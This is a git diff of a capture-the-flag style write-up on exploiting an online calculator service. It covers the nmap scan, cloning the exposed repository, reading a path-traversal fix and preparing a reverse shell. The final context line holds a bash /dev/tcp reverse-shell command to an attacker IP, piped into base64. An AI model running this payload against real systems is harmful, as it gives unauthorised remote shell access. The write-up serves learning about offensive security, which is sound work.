@@ -67,7 +67,7 @@ Port 5000 hosts the actual online calculator
 
 There's an error message when visiting port 8000
 
-![](<../../../../.gitbook/assets/image (28) (1).png>)
+![](<../../../../.gitbook/assets/image (28) (1) (1).png>)
 
 One thing that stood out in the nmap scan was this file path
 
@@ -119,7 +119,7 @@ git clone http://online-calc.com/projects/online-calc
 
 It looks like we can, and we have a couple of files we can take a look at
 
-![](<../../../../.gitbook/assets/image (47) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (47) (1) (1) (1).png>)
 
 These first two files seem to be the code that's running on port 800
 
@@ -143,7 +143,7 @@ These are , however, fixed. Yet, we can use the following command to view the di
 git diff 9aa6151c1d5e92ae0bd3d8ad8789ae9bb2d29edd 17f5d49be5ae6f0bc41fc90f5aabeccc90f6e2cd
 ```
 
-![](<../../../../.gitbook/assets/image (26) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (26) (1) (1) (1) (1).png>)
 
 Reading the code here tells us that the send\_from\_directory function sends any file from the server and if the requested path contains `..` or `%2E`, a 404 response is returned
 
@@ -199,7 +199,7 @@ Now we'll prepare our exploit to get a reverse shell on the target machine
 
 It should also be noted the `/` characters in the user payload would be converted to `* 1.0 /` by the `evaluate` function, so we'll use base64 to encode the payload
 
-![](<../../../../.gitbook/assets/image (23) (1) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (23) (1) (1) (1) (1).png>)
 
 ```bash
 echo 'bash -c "bash -i >& /dev/tcp/192.250.81.2/4444 0>&1"' | base64
